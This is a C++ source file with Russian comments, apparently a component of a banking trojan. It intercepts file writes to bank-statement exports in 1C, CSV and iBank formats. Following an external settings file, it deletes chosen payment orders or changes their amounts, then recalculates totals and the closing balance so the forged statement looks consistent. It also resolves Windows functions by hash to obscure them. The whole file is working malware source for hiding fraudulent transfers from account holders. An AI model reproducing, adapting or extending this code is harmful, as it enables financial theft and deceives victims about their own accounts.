// #include "Ibank.h"
#include "IBankExport.h"
//#ifdef RuBnkH
#include "Strings.h"
#include "Utils.h"

#include "BotDebug.h"

namespace IBANKEXPORT
{
	#include "DbgTemplates.h"
}

typedef BOOL ( WINAPI *PCloseHandle)( HANDLE hObject );
typedef BOOL ( WINAPI *PWriteFile)( HANDLE hFile, LPCVOID lpBuffer,	DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped );
extern PWriteFile Real_WriteFile;

// Объявляем шаблон вывода отладочных строк
#define DBG IBANKEXPORT::DBGOutMessage<>

//структура в которой содержится информация о текущих открытых файлах экспорта с их данными
struct SExpData
{
	HANDLE file; //открытый файл, если 0, то не используется (свободное место)
	char* data; //текущие данные
	int sz; //количество байт в data
	int szData; //количество выделенной памяти в data
	char format; //формат данных: 0 - неизвестно, 1 - 1С, 2 - csv, 3 - ibank
	int pos; //позиция в которой найден определяющий формат элемент файла, чтобы потом повторно не делать поиск
};

//информация о платежках которые нужно заменить или удалить
struct SExpSettings
{
	int oper; //какую операцию производить: 0 - удаление платежки, 1 - замена данных
	char num[8]; //номер платежки
	char amount[16]; //сумма
	SExpSettings* next;
};

SExpData* sexpFiles = 0; //массив для обрабатывания нескольких файлов
const int MaxSExpFiles = 10; //размер массива SExpFiles, это максимальное количество файлов которое может одновременно обрабатываться

SExpSettings* expSettings = 0; //загружаемые из вне настройки

//названия колонок в CSV формате
static char* fieldsCSV[] =
{
	"Номер документа", //0
	"Дебет" //1 - сумма
};

static char* fields1C[] =
{
	"Номер", //0
	"Сумма"  //1
};

static char* fieldsIBank[] =
{
	"DOC_NUM", //0
	"AMOUNT"   //1
};

const int CountFields = 2; //количество используемых полей

static void ReleaseSettings()
{
	SExpSettings* curr = expSettings;
	while( curr )
	{
		SExpSettings* del = curr;
		curr = curr->next;
		HEAP::Free(del);
	}
	expSettings = 0;
}

//инициализация настроек
static bool InitSettings( char* ptr, int sz )
{
	bool ret = true;
	char* ptr1 = ptr;
	expSettings = 0;
	SExpSettings** last = &expSettings;  //последний элемент в списке
	while( sz > 0 && ret )
	{
		SExpSettings setting;
		m_memset( &setting, 0, sizeof(SExpSettings) );
		int id = 0; //ид элемента в который заносятся данные
		int state = 0;
		if( *ptr++ == '{' ) //ищем начало настройки
		{
			while( sz > 0 && ret )
			{
				//ищем токен, т. е. начальную и конечную его позицию
				while( *ptr <= 32 && sz > 0 ) ptr++, sz--; //игнорируем все бесполезные символы
				if( sz <= 0 ) break;
				if( *ptr == '}' ) //конец настройки
				{
					ptr++;
					sz--;
					//копируем в список
					*last = (SExpSettings*)HEAP::Alloc( sizeof(SExpSettings) );
					if( *last == 0 )
					{
						ret = false;
						break;
					}
					m_memcpy( *last, &setting, sizeof(SExpSettings) );
					last = &((*last)->next);
					break;
				}
				char* beg = ptr; //начало токена
				if( state == 2 && *ptr == '=' ) //в состоянии 2 должен быть разделитель '='
					ptr++, sz--;
				else
					while( *ptr > 32 && sz > 0 ) ptr++, sz--; //ищем конец токена
				if( sz <= 0 ) break;
				bool err = false;
				int len = ptr - beg; //длина токена
				switch( state )
				{
					case 0: //чтение кода операции
						setting.oper = (int)pStrToIntA(beg); //переводит строку в число, даже если за число не числовой символ
						break;
					case 1: //ожидаем id элемента
						id = (int)pStrToIntA(beg);
						if( id == 0 ) err = true;
						break;
					case 2: //ожидаем '='
						if( *beg != '=' ) err = true;
						break;
					case 3: //ожидаем значение для элемента
						break;
				}
				if( err ) 
				{
					ret = false;
					break;
				}
				if( state == 3 ) //нашли значение элемента, теперь запоминаем его
				{
					switch( id )
					{
						case 1: //номер платежки
							if( len < sizeof(setting.num) - 1 )
								m_memcpy( &setting.num, beg, len ); //нуль в конце уже будет, ставится выше обнулением структуры
							break;
						case 2: //сумма
							if( len < sizeof(setting.amount) - 1 )
								m_memcpy( &setting.amount, beg, len );
							break;
					}
					state = 1;
				}
				else
					state++;
			}
		}
		else
			sz--;
	}
	if( !ret )
		ReleaseSettings();
	return ret;
}

//инициализация данных для контроля экспорта
bool SExpInit(const char* fileSettings)
{
	sexpFiles = (SExpData*)HEAP::Alloc( MaxSExpFiles * sizeof(SExpData) ); //при выделении памяти будут записаны 0 
	if( sexpFiles == 0 ) return false;
	if( fileSettings != 0 )
	{
		expSettings = 0;
		DWORD sz;
		char* ptr = (char*)File::ReadToBufferA( (char*)fileSettings, sz ); //чистаем полностью файл настроек
		bool err = false;
		if( ptr )
		{
			err = !InitSettings( ptr, sz );
			MemFree(ptr);
		}
		else
			err = true;
		if( err ) //не прочелся файл или в файле что-то нето, уходим красиво
		{
			SExpRelease();
			return false;
		}
	}
	return true;
}

void SExpRelease()
{
	for( int i = 0; i < MaxSExpFiles; i++ )
		if( sexpFiles[i].data )
			HEAP::Free(sexpFiles[i].data);
	HEAP::Free(sexpFiles);
	sexpFiles = 0;
	ReleaseSettings();
}

bool SExpCreateFile( HANDLE file, LPCWSTR lpFileName )
{
	if( sexpFiles )
	{
		PWCHAR p = WSTR::ScanEnd( (PWCHAR)lpFileName, '.' ); //начало расширения
		if( p ) //расширение есть
		{
			//DWORD hash = WSTR::GetHash( p, 0, true ));
			if( lpFileName[0] != '\\' ) //игнорируем открытие портов (типа \\.\PIPE\lsarpc)
			{
				for( int i = 0; i < MaxSExpFiles; i++ )
					if( sexpFiles[i].file == 0 ) //ячейка свободна
					{
						sexpFiles[i].file = file; //запоминаем
						sexpFiles[i].data = 0;
						sexpFiles[i].sz = 0;
						sexpFiles[i].format = 0;
						return true;
					}
			}
		}
	}
	return false;
}

//ищет в массиве sexpFiles нужный file
static SExpData* FindFile(HANDLE file)
{
	if( sexpFiles )
	{
		for( int i = 0; i < MaxSExpFiles; i++ )
			if( sexpFiles[i].file == file )
				return &sexpFiles[i];
	}
	return 0;
}

//выделяет память с учетом уже выделенной, addSz - на сколько больше нужно памяти
static void AllocMem( SExpData* info, int addSz )
{
	if( info->data )
	{
		info->sz += addSz;
		if( info->sz > info->szData - 1 ) //нужно всегда 1 больше для завершающего нуля
		{
			info->szData = info->sz + addSz + 1024; //выделяем больше, чтобы потом не перевыделять часто
			info->data = (char*)HEAP::ReAlloc( info->data, info->szData );
		}
	}
	else
	{
		info->szData = addSz + 1024;
		info->sz = addSz;
		info->data = (char*)HEAP::Alloc(info->szData);
	}
}

//проверяет нужного ли нам формата файл, если да, то запоминает какой
static bool IsExport(SExpData* info)
{
	bool ret = false;
	//проверка на формат 1C
	char* ptr = m_strstr( info->data, "1CClientBankExchange" );
	if( ptr != 0 )
	{
		int pos = ptr - info->data;
		if( pos < 10 ) //найденный токен толжен быть в начале
		{
			ptr = m_strstr( info->data, "Платежное поручение" );
			pos = ptr - info->data;
			if( pos < 512 ) //выражение "Платежное поручение" должно быть в начале файла
			{
				info->format = 1; //данные в формате 1C
				info->pos = pos;
				ret = true;
			}
		}
	}
	else
	{
		//проверка на формат CSV
		ptr = m_strstr( info->data, fieldsCSV[0] ); //ищем "Номер документа"
		if( ptr != 0 )
		{
			int pos = ptr - info->data;
			if( pos < 200 )
			{
				info->format = 2; //данные в формате CSV
				info->pos = pos;
				ret = true;
			}
		}
		else
		{
			//проверка на формат ibank
			ptr = m_strstr( info->data, "$OPERS_LIST" );
			if( ptr != 0 )
			{
				int pos = ptr - info->data;
				if( pos < 10 ) //найденный токен толжен быть в начале
				{
					ptr = m_strstr( info->data, "$OPERATION" );
					pos = ptr - info->data;
					if( pos < 256 ) //выражение "Платежное поручение" должно быть в начале файла
					{
						info->format = 3; //данные в формате ibank
						info->pos = pos;
						ret = true;
					}
				}
			}
		}
	}
	return ret;
}

//заменяет в файле данные между beg и end новым значением newVal, если newVal = 0, то данные удаляются
//возращает насколько увеличился или уменьшился файл. crk - указатель аналогичный beg или end, его значение корректируется в случае перевыделения памяти
static int ChangeData( SExpData* info, char*& beg, char*& end, char*& crk, const char* newVal )
{
	int len1 = end - beg;
	int len2 = newVal ? m_lstrlen( (char*)newVal) : 0;
	int dlen = len2 - len1; //на какую длину уменьшиться или увеличится файл
	int newSz = info->sz + dlen;
	if( newSz > info->szData ) 
	{
		int p1 = beg - info->data; //запоминаем позиции, так как область памяти изменится
		int p2 = end - info->data;
		int p3 = crk - info->data;
		AllocMem( info, dlen );
		beg = info->data + p1;
		end = info->data + p2;
		crk = info->data + p3;
	}
	if( dlen > 0 ) //длина увеличилась, копируем с конца
	{
		int to = (end - info->data) + dlen;
		for( int i = newSz + 1; i >= to; i-- )
			info->data[i] = info->data[i - dlen];
	}
	else
	{
		if( dlen < 0 )
		{
			m_memcpy( end + dlen, end, info->sz + 1 - (end - info->data) );
		}
	}
	if( len2 > 0 )
	{
		m_memcpy( beg, newVal, len2 );
	}
	info->sz = newSz;
	return dlen;
}

//ищет поле nameField и возвращает начало его значения, а в len - длину значения
static char* GetValField( char* beg, char* end, const char* nameField, int& len )
{
	char* ptr = 0;
	len = 0;
	for(;;)
	{
		ptr = m_strstr( beg, nameField ); //ищем название поля в пределах от beg до end
		if( ptr == 0 ) break;
		if( ptr < end )
		{
			ptr += m_lstrlen((char*)nameField);
			if( *ptr == '=' ) //после названия поля должно обязательно стоять '='
			{
				char* ptr2 = ++ptr;
				while( *ptr2 != '\r' && *ptr2 != '\n' ) ptr2++; //идем до конца строки, он обязательно будет
				len = ptr2 - ptr;
				break;
			}
			else
				beg = ptr + 1; //ищем дальше
		}
		else
		{
			ptr = 0;
			break;
		}
	}
	return ptr;
}

//переводит сумму в целое число, рубли умножает на 100 и прибавляет копейки
static LONGLONG SumToInt64( const char* from, int len )
{
	char buf[32]; //сюда загоняем сумму без точки
	char* p = buf;
	while( len-- )
	{
		if( *from != '.' && *from != ',' )
			*p++ = *from;
		from++;
	}
	LONGLONG ret;
	pStrToInt64ExA( buf, 0, &ret );
	return ret;
}

//переводит сумму, находящуюся в целом числе, в строку в которой копейки отделены точкой
static char* Int64ToSum( LONGLONG from, char* to )
{
	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
	int len = _pwsprintfA( to, "%03I64d", from ); //03 делаем для того чтобы для сумм меньше 1.00 было нужное количество нулей, т. е. сумма = 0, то в строке будет 000, и в последствии будет сделано 0.00
	//отделяем копейки и ставим перед ними точку (перемещаем две последнии цифры вправо и перед ними ставим точку)
	to[len] = to[len - 1];
	to[len - 1] = to[len - 2];
	to[len - 2] = '.';
	to[len + 1] = 0;
	return to;
}

//меняет знак в сумме, необходимо для формата IBank, так как там в платежках на списание отрицательные суммы, а в других
//положиетельные, в настройках тоже положительные
static char* NegSum( const char* from, char* to )
{
	char* ret = to;
	if( *from == '-' )
		from++;
	else
		*to++ = '-';
	while( *from ) *to++ = *from++;
	*to = 0;
	return ret;
}

bool SExpWriteFile( HANDLE file, LPCVOID buf, DWORD sz )
{
	bool ret = true;
	SExpData* info = FindFile(file);
	if( info )
	{
		int endPos = info->sz; //куда помещать новые данные
		AllocMem( info, sz ); //выделяем нужное количество памяти
		m_memcpy( info->data + endPos, buf, sz );
		info->data[info->sz] = 0;
		if( info->sz >= 512 && info->format == 0 ) //если количество данных достаточно для определение формата, то определяем формат
		{
			if( !IsExport(info) ) //не наши данные
			{
			//выгружаем, то что уже передали
				DWORD bw;
				if( sz != info->sz ) //если пришли сразу нужное количество данных для определения формата, то сами их не выгружаем, пусть это делает внешняя функция
				{
					Real_WriteFile( file, info->data, info->sz, &bw, 0 );
					ret = false;
				}
				HEAP::Free(info->data);
				info->file = 0;
				info->data = 0;
				info->sz = 0;
			}
			//else
			//	DBG( "IEXPORT", "Export format %d", info->format );
		}
	}
	else
		ret = false;
	return ret;
}

//правка для формата 1С
static void Format1C( SExpData* info )
{
	DBG( "IEXPORT", "Format1C" );
	const char* start = "СекцияДокумент=Платежное поручение";
	const char* finish = "КонецДокумента";
	const int lenFinish = 14;
	int begBalance = 0, lenBegBalance = 0; //координаты начального остатка
	int endBalance = 0, lenEndBalance = 0; //координаты конечного остатка
	int sumAdd = 0, lenSumAdd = 0; //всего поступило
	int sumSub = 0, lenSumSub = 0; //всего списано

	char* ptr = m_strstr( info->data, start ); //ищем первую секцию платежного поручения
	if( ptr == 0 ) return;
	char* ptr2 = m_strstr( info->data, "СекцияРасчСчет" );  //в этой секции ищет счет по которому идут операции
	if( ptr2 == 0 ) return;
	int account = 0, lenAccount; //начало счета и длина счета
	ptr2 = GetValField( ptr2, ptr, "РасчСчет", lenAccount ); if( ptr2 ) account = ptr2 - info->data;
	//узнаем координаты значений итоговых полей
	ptr2 = GetValField( info->data, ptr, "НачальныйОстаток", lenBegBalance ); if( ptr2 ) begBalance = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "ВсегоПоступило", lenSumAdd ); if( ptr2 ) sumAdd = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "ВсегоСписано", lenSumSub ); if( ptr2 ) sumSub = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "КонечныйОстаток", lenEndBalance ); if( ptr2 ) endBalance = ptr2 - info->data;
	//конвертируем строки сумм в целые числа
	LONGLONG valSumAdd = SumToInt64( info->data + sumAdd, lenSumAdd ); 
	LONGLONG valSumSub = SumToInt64( info->data + sumSub, lenSumSub ); 
	LONGLONG valEndBalance = SumToInt64( info->data + endBalance, lenEndBalance ); 
	for(;;)
	{
		char* end = m_strstr( ptr, finish );
		if( end == 0 ) break;
		end += lenFinish;
		while( *((unsigned char*)end) < ' ' && *end != 0 ) end++; //идем на начало следующей строки
		
		int lenNum;
		char* begNum = GetValField( ptr, end, fields1C[0], lenNum );
		if( begNum == 0 ) break;
		SExpSettings* curr = expSettings;
		while( curr )
		{
			//ищем номер документа
			if( m_lstrncmp( begNum, curr->num, lenNum ) == 0 ) //номер документа совпал
			{
				//ищем счет платильщика, чтобы знать какая платежка расходная или приходная
				int lenAccount2;
				char* account2 = GetValField( ptr, end, "ПлательщикСчет", lenAccount2 );
				bool debet = true; //платежка расходная
				*(info->data + account + lenAccount) = 0;
				*(account2 + lenAccount2) = 0;
				char c = account2[lenAccount2];
				account2[lenAccount2] = 0; //для правильного сравнения
				if( lenAccount != lenAccount2 || m_lstrncmp( info->data + account, account2, lenAccount ) != 0 ) //другой счет, значит платежка приходная
					debet = false;
				account2[lenAccount2] = c;
				if( curr->oper == 0 ) //удаление всей платежки
				{
					//перед удаление ищем сумму в платежке
					int lenVal;
					char* p = GetValField( ptr, end, fields1C[1], lenVal );
					if( p )
					{
						LONGLONG val = SumToInt64( p, lenVal );
						//убираем сумму из итогов
						if( debet ) //расход
						{
							valSumSub -= val;
							valEndBalance += val;
						}
						else //приход
						{
							valSumAdd -= val;
							valEndBalance -= val;
						}
					}
					//удаляем всю платежку
					end += ChangeData( info, ptr, end, begNum, 0 );
				}
				else
				{
					for( int i = 1; i < CountFields; i++ )
					{
						int lenVal;
						char* p = GetValField( ptr, end, fields1C[i], lenVal );
						if( p )
						{
							char* newVal = 0;
							switch( i )
							{
								case 1: //сумма
									newVal = curr->amount;
									{
										LONGLONG val1 = SumToInt64( p, lenVal ); //сумма в платежке
										LONGLONG val2 = SumToInt64( newVal, m_lstrlen(newVal) ); //новая сумма
										LONGLONG val = val2 - val1;
										//убираем разницу из итогов
										if( debet ) //расход
										{
											valSumSub += val;
											valEndBalance -= val;
										}
										else //приход
										{
											valSumAdd += val;
											valEndBalance += val;
										}
									}
									break; 
							}
							if( newVal && newVal[0] ) //если есть что заменять
							{
								char* p2 = p + lenVal;
								int pptr = ptr - info->data; //запоминаем позиция на случай перевыделения памяти
								end += ChangeData( info, p, p2, end, newVal );
								ptr = info->data + pptr;
							}
						}
					}
				}
				break;
			}
			curr = curr->next;
		}
		ptr = m_strstr( end, start );
		if( ptr == 0 ) break;
	}
	//заменяем итоги
	char buf[32];
	//ВсегоПоступило
	char* p1 = info->data + sumAdd;
	char* p2 = p1 + lenSumAdd;
	sumSub += ChangeData( info, p1, p2, p2, Int64ToSum( valSumAdd, buf ) );
	//ВсегоСписано
	p1 = info->data + sumSub;
	p2 = p1 + lenSumSub;
	endBalance += ChangeData( info, p1, p2, p2, Int64ToSum( valSumSub, buf ) );
	//КонечныйОстаток
	p1 = info->data + endBalance;
	p2 = p1 + lenEndBalance;
	ChangeData( info, p1, p2, p2, Int64ToSum( valEndBalance, buf ) );
}

//правка для формата CSV
static void FormatCSV( SExpData* info )
{
	DBG( "IEXPORT", "FormatCSV" );
	char sep = info->data[info->pos - 1]; //разделитель полей info->pos получен в функции IsExport()
	//считаем количество полей по количеству разделителей
	char *ptr = info->data;
	int n = 0; //номер колонки
	int numClns[CountFields]; //номера колонок 
	for( int i = 0; i < CountFields; i++ ) //в начале делаем что колонки не найдены
		numClns[i] = -1;
	char* beg = ptr;
	while(true) 
	{
		if( *ptr == sep || *ptr == '\r' || *ptr == '\n' || *ptr == 0 ) //либо разделитель колонок, либо конец строки
		{
			int len = ptr - beg;
			for( int i = 0; i < CountFields; i++ )
				if( m_lstrncmp( beg, fieldsCSV[i], len ) == 0 )
				{
					numClns[i] = n; //запоминаем номер колонки для поля
				}
			if( *ptr != sep ) break; //конец строки
			beg = ptr + 1;
			n++;
		}
		ptr++;
	}
	while( *ptr < ' ' && *ptr != 0 ) ptr++; //обходим завершение строки, идем на начало строки
	while( *ptr )
	{
		//выделяем очередную строку
		beg = ptr;
		n = 0;
		char *numBeg = ptr, *numEnd = ptr; //начало и конец значения номера документа в строке
		while(true) //идем до конца строки, попутно ищем значение номера документа
		{
			if( *ptr == sep || *ptr == '\r' || *ptr == '\n' || *ptr == 0 )
			{
				if( n >= 0 )
					if( n == numClns[0] ) //это колонка со значением номера документа
					{
						numEnd = ptr;
						n = -1; //больше искать не нужно
					}
					else
					{
						numBeg = ptr + 1;
						n++;
					}
				if( *ptr != sep ) break; //не конец строки
			}
			ptr++; 
		}
		char* end = ptr;
		while( *ptr < ' ' && *ptr != 0 ) ptr++; //идем начало след строки
		//проходимся по настройкам и согласно им выполняем указанные действия
		int numLen = numEnd - numBeg; //длина значения номера документа
		//printf( "%x-%x=%d\n", numBeg - info->data, numEnd - info->data, numLen );
		SExpSettings* curr = expSettings;
		while( curr )
		{
			if( m_lstrncmp( numBeg, curr->num, numLen ) == 0 ) //строка для текущей настройки, т. е. номер документа совпал
			{
				if( curr->oper == 0 ) //удаление строки
				{
					ChangeData( info, beg, ptr, end, 0 );
					ptr = beg; //следующая строка
				}
				else //замена данных
				{
					char* p = beg;
					n = 0;
					int ll = ptr - end; //нужно для вычисления значения ptr относительно end, так как из-за перевыделения памяти ptr может быть неактуальным
					while( p < end ) //отсчитываем колонки 
					{
						if( *p == sep )
						{
							for( int i = 1; i < CountFields; i++ )
								if( n == numClns[i] )
								{
									char* newVal = 0;
									switch( i )
									{
										case 1:  //сумма
											newVal = curr->amount;
											break;
									}
									if( newVal && newVal[0] ) //если есть что заменять
									{
										int dlen = ChangeData( info, beg, p, end, newVal );
										p += dlen;
										end += dlen;
									}
								}
							n++;
							beg = p + 1;
						}
						p++;
					}
					ptr = end + ll;
				}
				break;
			}
			curr = curr->next;
		}
	}
}

//правка для формата IBank
static void FormatIBank( SExpData* info )
{
	DBG( "IEXPORT", "FormatIBank" );
	const char* start = "$OPERATION";
	const char* finish = "$OPERATION_END";
	const int lenFinish = 14;
	int begBalance = 0, lenBegBalance = 0; //координаты начального остатка
	int endBalance = 0, lenEndBalance = 0; //координаты конечного остатка
	int sumAdd = 0, lenSumAdd = 0; //всего поступило
	int sumSub = 0, lenSumSub = 0; //всего списано

	char* ptr = m_strstr( info->data, start ); //ищем первую секцию платежного поручения
	if( ptr == 0 ) return;
	//узнаем координаты значений итоговых полей
	char* ptr2 = GetValField( info->data, ptr, "IN_REST", lenBegBalance ); if( ptr2 ) begBalance = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "CREDIT", lenSumAdd ); if( ptr2 ) sumAdd = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "DEBET", lenSumSub ); if( ptr2 ) sumSub = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "OUT_REST", lenEndBalance ); if( ptr2 ) endBalance = ptr2 - info->data;
	//конвертируем строки сумм в целые числа
	LONGLONG valSumAdd = SumToInt64( info->data + sumAdd, lenSumAdd ); 
	LONGLONG valSumSub = SumToInt64( info->data + sumSub, lenSumSub ); 
	LONGLONG valEndBalance = SumToInt64( info->data + endBalance, lenEndBalance ); 
	for(;;)
	{
		char* end = m_strstr( ptr, finish );
		if( end == 0 ) break;
		end += lenFinish;
		while( *((unsigned char*)end) < ' ' && *end != 0 ) end++; //идем на начало следующей строки
		
		int lenNum;
		char* begNum = GetValField( ptr, end, fieldsIBank[0], lenNum );
		if( begNum == 0 ) break;
		SExpSettings* curr = expSettings;
		while( curr )
		{
			//ищем номер документа
			if( m_lstrncmp( begNum, curr->num, lenNum ) == 0 ) //номер документа совпал
			{
				if( curr->oper == 0 ) //удаление всей платежки
				{
					//перед удаление ищем сумму в платежке
					int lenVal;
					char* p = GetValField( ptr, end, fieldsIBank[1], lenVal );
					if( p )
					{
						LONGLONG val = SumToInt64( p, lenVal );
						//убираем сумму из итогов
						if( val < 0 ) //расход
						{
							valSumSub -= -val;
							valEndBalance += -val;
						}
						else //приход
						{
							valSumAdd -= val;
							valEndBalance -= val;
						}
					}
					//удаляем всю платежку
					end += ChangeData( info, ptr, end, begNum, 0 );
				}
				else
				{
					for( int i = 1; i < CountFields; i++ )
					{
						int lenVal;
						char* p = GetValField( ptr, end, fieldsIBank[i], lenVal );
						if( p )
						{
							char* newVal = 0;
							char neg[32]; //для замены знака в суммах
							switch( i )
							{
								case 1: //сумма
									{
										LONGLONG val1 = SumToInt64( p, lenVal ); //сумма в платежке
										LONGLONG val2 = SumToInt64( curr->amount, m_lstrlen(curr->amount) ); //новая сумма
										if( val1 < 0 ) //расход
										{
											LONGLONG val = val2 - (-val1);
											//убираем разницу из итогов
											valSumSub += val;
											valEndBalance -= val;
											newVal = NegSum( curr->amount, neg );
										}
										else //приход
										{
											LONGLONG val = val2 - val1;
											valSumAdd += val;
											valEndBalance += val;
											newVal = curr->amount;
										}
									}
									break; 
							}
							if( newVal && newVal[0] ) //если есть что заменять
							{
								char* p2 = p + lenVal;
								int pptr = ptr - info->data; //запоминаем позиция на случай перевыделения памяти
								end += ChangeData( info, p, p2, end, newVal );
								ptr = info->data + pptr;
							}
						}
					}
				}
				break;
			}
			curr = curr->next;
		}
		ptr = m_strstr( end, start );
		if( ptr == 0 ) break;
	}
	//заменяем итоги
	char buf[32];
	//КонечныйОстаток
	char* p1 = info->data + endBalance;
	char* p2 = p1 + lenEndBalance;
	sumAdd += ChangeData( info, p1, p2, p2, Int64ToSum( valEndBalance, buf ) );
	//ВсегоПоступило
	p1 = info->data + sumAdd;
	p2 = p1 + lenSumAdd;
	sumSub += ChangeData( info, p1, p2, p2, Int64ToSum( valSumAdd, buf ) );
	//ВсегоСписано
	p1 = info->data + sumSub;
	p2 = p1 + lenSumSub;
	ChangeData( info, p1, p2, p2, Int64ToSum( valSumSub, buf ) );
}

void SExpCloseHandle(HANDLE file)
{
	SExpData* info = FindFile(file);
	if( info )
	{
		if( info->format == 0 ) IsExport(info); //если формат не известен, то узнаем какой
		//правим данные
		switch( info->format )
		{
			case 1: //1С
				Format1C(info);
				break;
			case 2: //CSV
				FormatCSV(info);
				break;
			case 3: //IBank
				FormatIBank(info);
				break; 
		}
		//выгружаем в файл
		DWORD bw;
		Real_WriteFile( file, info->data, info->sz, &bw, 0 );
		//очистка памяти
		HEAP::Free(info->data);
		info->file = 0;
		info->data = 0;
		info->sz = 0;
	}
}
